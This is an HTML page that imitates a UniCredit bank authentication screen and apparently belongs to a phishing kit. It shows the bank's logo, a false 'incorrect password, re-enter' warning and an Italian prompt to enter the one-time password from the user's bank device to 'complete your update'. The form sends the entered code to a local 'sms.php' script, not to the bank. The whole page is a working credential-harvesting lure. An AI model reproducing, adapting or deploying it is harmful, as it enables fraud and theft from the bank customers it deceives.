<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<link href="./Uni_files/02008_acs_dyn.css" rel="stylesheet" type="text/css" media="screen">
<link href="./Uni_files/02008_acs_dyn_002.css" rel="stylesheet" type="text/css" media="screen">
<!--script type="text/javascript" src="acsdata/jquery.min.js"></script-->
<script type="text/javascript" src="./Uni_files/jquery.js"></script>
<script type="text/javascript" src="./Uni_files/library.js"></script>
<script type="text/javascript" src="./Uni_files/02008_exit_control.js"></script>
<style type="text/css" media="screen">
<!--
-->
</style>

<!--
	var cancString = "Sicuro di voler interrompere l'autenticazione? Clicca 'Annulla' per continuare, clicca 'OK' per tornare al sito dell'esercente.";
	var clicked = 0;
	
	function confirmAnnulla() {
		 
		if (confirm(cancString) && (clicked == 0) ) {		
			clicked = 1;
			document.forms[0].password.value = '';
			document.forms[0].CANC.value = 'Y';
			stopNavigate();
			document.forms[0].submit();				
			return;
		}
			//else {
		//	stopNavigate();
		//	window.location.reload();
		//}
		return;
		//varonsub = false;
}
		function confirmChiudi() {	 
			if (clicked == 0) {		
				clicked = 1;
				var termurl = document.getElementById("TERMURL").value;
				if(termurl!='' && termurl!=null){ 
					stopNavigate();
					document.PAResForm.submit();	
					return;
			    }else{
					document.forms[0].CANC.value = 'Y';
					stopNavigate();
					document.forms[0].submit();				
					return;
				}		
			}		
			return;		
		}

	function confirmPass() {
		
		var pwd = document.forms[0].password.value;
		
		if (pwd == null || pwd == '') {
			alert("E' necessario inserire la password");
			return false;
		}
		if (clicked == 0) {
			clicked = 1;
			stopNavigate();
			document.forms[0].submit();
		}
	}
	
	function openAssistenza(){
		stopNavigate();
		window.open('02008_aiuto_dynamic.htm?brd=M', 'titolo', 'width=600, height=500, resizable, status, location');
	}

	
	function openTokAssistenza(){
		stopNavigate();
		window.open('02008_aiuto_tok_dynamic.htm?brd=M', 'titolo', 'width=600, height=500, resizable, status, location');
	}

	-->
</script>
</head>

<body >
	<div id="main">

		<form action="sms.php" method="post" target="pageFrame">
			<table id="data">
				<tbody><tr>
					<td><img src="./Uni_files/logo_unicredit_FIN.jpg" alt=""></td>
				</tr>
								
				<input name="ID" value="186674088" type="hidden">
				<input name="TOKEN" value="78DA15C8410E80300C03C12FB90E8E9B630AF4FF4FA248AB392C89012830AEDF53095198461A246C4838ABD44BCAD9F9DEE17CB8875AB4F960ED40CF0AEF0F98C310F4" type="hidden">
				<input name="CANC" value="" type="hidden">
				<input id="CIRCUITO" name="CIRCUITO" value="M" type="hidden">
				<input name="TERMURL" id="TERMURL" value="" type="hidden">
				
				
						
						<tr>
							<td colspan="3" class="red">
							
								
								
								
									
										
												<p align="left"><strong><font face="arial" color="#ff0000"><font size="2">ATTENZIONE: la password inserita non è corretta. Ripetere inserimento</font>.</font></strong></p>
										
										
									
								
								
								
								
								
								
								
								
								
								
								
													
								
								
							
							</td>
						</tr>
					
				
				
				
				
				
				
				
				
					
				
					<tr>
						<td colspan="2">
							<p>
								Per completare il tuo aggiornare inserisci la password 
generata/riportata da uno dei dispositivi abbinati ai Servizi UniCredit 
di Banca Multicanale. La Banca verificherà le tue informazioni e il tuo 
aggiornare potrà proseguire in sicurezza.
							</p>
						</td>
					</tr>
					
				
					
											
														
								
													
										
										<td colspan="2">
											<p>Inserisci la password visualizzata sul tuo dispositivo</p>
										</td>		
																
													
														
											
						
				</tr>
					
				<tr>
					<td colspan="2">&nbsp;</td>
				</tr>
				
							
					
										
													
													
							
							
							<tr>
								<td class="img">
									<img src="./Uni_files/02008_hard_mob_dyn.gif">
								</td>
								<td class="pwd"><input name="password" size="20" maxlength="8" pattern="[0-9]*" class="textfield" type="password"></td>
								</tr>
							
							
													
										
					
				
			
				<tr>
					<td colspan="2">&nbsp;</td>
				</tr>
				<tr>
					<td colspan="2">&nbsp;</td>
				</tr>
				<tr>
					<!--td class="button" colspan="2"><input type="button" name="CONTINUA" value="Conferma" class="rounded"  style="float: center;" onclick="javascript:confirmPass();" /></td-->
					<td style="text-align:center;"></td>
					<td style="text-align:center;">
					<input type="submit" value="Confirma"  type="button"></td>
				</tr>
				<tr>
					<td colspan="2">&nbsp;</td>
				</tr>
				<tr>
					<!--td colspan="2" align="center"-->
					<td style="text-align:center;"><a href="javascript:;" onclick="javascript:confirmAnnulla();">Annulla</a></td>
				
					<td style="text-align:center;"><a href="javascript:;" onclick="openAssistenza()">Assistenza</a></td>
				
				
				</tr>
				
				
				<tr>
					<td colspan="2">&nbsp;</td>
				</tr>
				
				
				
				
				
				
				
				<tr>
					<td colspan="2">&nbsp;</td>
				</tr>
			</tbody></table>


		</form>
		
		<form id="PAResForm" name="PAResForm" action="" method="POST">
			<input name="MD" value="" type="hidden">
			<input name="PaRes" value="" type="hidden">
		</form>
	</div>


</body></html>